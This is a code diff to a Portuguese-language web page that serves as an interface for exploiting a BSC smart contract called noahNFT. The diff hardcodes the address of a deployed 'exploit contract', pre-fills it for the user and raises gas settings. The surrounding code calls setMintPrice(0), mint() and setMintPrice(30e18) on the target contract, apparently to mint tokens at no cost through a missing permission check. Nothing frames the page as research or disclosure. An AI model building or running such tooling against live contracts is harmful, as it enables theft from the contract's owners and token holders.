@@ -273,7 +273,7 @@
                 </div>
                 <div class="col-md-6">
                     <strong>Contrato de Exploração:</strong><br>
-                    <span id="exploitContract">Não configurado</span>
+                    <span id="exploitContract">0xddF65c0A504fE89aBAA540DcD42512e8232fe134</span>
                 </div>
             </div>
         </div>
@@ -366,10 +366,10 @@
                 <!-- Configurar Contrato de Exploração -->
                 <div class="contract-deploy">
                     <h5><i class="fas fa-cog"></i> Configurar Contrato de Exploração</h5>
-                    <p>Insira o endereço do contrato de exploração que você implantou no Remix IDE.</p>
+                    <p>O endereço do contrato de exploração já está preenchido. Apenas clique em "Configurar" para começar.</p>
                     <div class="input-group mb-3">
                         <span class="input-group-text">Endereço do Contrato:</span>
-                        <input type="text" class="form-control" id="exploitContractInput" placeholder="0x0De99989878Dcdc9fe5bB7273bE83A177d596Da0" value="0x0De99989878Dcdc9fe5bB7273bE83A177d596Da0">
+                        <input type="text" class="form-control" id="exploitContractInput" placeholder="0x..." value="0xddF65c0A504fE89aBAA540DcD42512e8232fe134">
                         <button class="btn btn-primary" id="setExploitContractBtn">Configurar</button>
                     </div>
                     <div id="exploitStatus" class="success-box" style="display: none;">
@@ -385,14 +385,14 @@
                         <div class="col-md-6">
                             <div class="input-group mb-3">
                                 <span class="input-group-text">Limite de Gás:</span>
-                                <input type="number" class="form-control" id="gasLimitInput" placeholder="300000" value="800000">
+                                <input type="number" class="form-control" id="gasLimitInput" placeholder="300000" value="1000000">
                                 <span class="input-group-text">unidades</span>
                             </div>
                         </div>
                         <div class="col-md-6">
                             <div class="input-group mb-3">
                                 <span class="input-group-text">Preço do Gás:</span>
-                                <input type="number" class="form-control" id="gasPriceInput" placeholder="5" value="10">
+                                <input type="number" class="form-control" id="gasPriceInput" placeholder="5" value="15">
                                 <span class="input-group-text">Gwei</span>
                             </div>
                         </div>
@@ -521,6 +521,7 @@
 
         <div class="footer">
             <p>Contrato Original: 0x660689af09aB2628afBd781e541bB1DD3d316DD9</p>
+            <p>Contrato de Exploração: 0xddF65c0A504fE89aBAA540DcD42512e8232fe134</p>
             <p>Rede: BSC (BEP-20)</p>
         </div>
     </div>
@@ -531,6 +532,7 @@
         // Configurações
         const ORIGINAL_CONTRACT_ADDRESS = "0x660689af09aB2628afBd781e541bB1DD3d316DD9";
         const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT na BSC
+        const EXPLOIT_CONTRACT_ADDRESS = "0xddF65c0A504fE89aBAA540DcD42512e8232fe134"; // Endereço do contrato de exploração
         
         // ABI do contrato noahNFT
         const ORIGINAL_CONTRACT_ABI = [
@@ -854,8 +856,8 @@
             
             try {
                 // Obter opções de gás
-                const gasLimit = parseInt(gasLimitInput.value) || 800000;
-                const gasPrice = ethers.utils.parseUnits(gasPriceInput.value.toString() || '10', 'gwei');
+                const gasLimit = parseInt(gasLimitInput.value) || 1000000;
+                const gasPrice = ethers.utils.parseUnits(gasPriceInput.value.toString() || '15', 'gwei');
                 
                 // Configurar opções de transação
                 const options = {
@@ -914,7 +916,7 @@
                 // Testar setMintPrice(0)
                 const tx = await originalContract.setMintPrice(0, {
                     gasLimit: 200000,
-                    gasPrice: ethers.utils.parseUnits('10', 'gwei')
+                    gasPrice: ethers.utils.parseUnits('15', 'gwei')
                 });
                 
                 showTransactionInfo(tx.hash);
@@ -946,7 +948,7 @@
                 // Testar mint()
                 const tx = await originalContract.mint({
                     gasLimit: 300000,
-                    gasPrice: ethers.utils.parseUnits('10', 'gwei')
+                    gasPrice: ethers.utils.parseUnits('15', 'gwei')
                 });
                 
                 showTransactionInfo(tx.hash);
@@ -982,7 +984,7 @@
                 // Testar setMintPrice(30e18)
                 const tx = await originalContract.setMintPrice(ethers.utils.parseUnits('30', 18), {
                     gasLimit: 200000,
-                    gasPrice: ethers.utils.parseUnits('10', 'gwei')
+                    gasPrice: ethers.utils.parseUnits('15', 'gwei')
                 });
                 
                 showTransactionInfo(tx.hash);
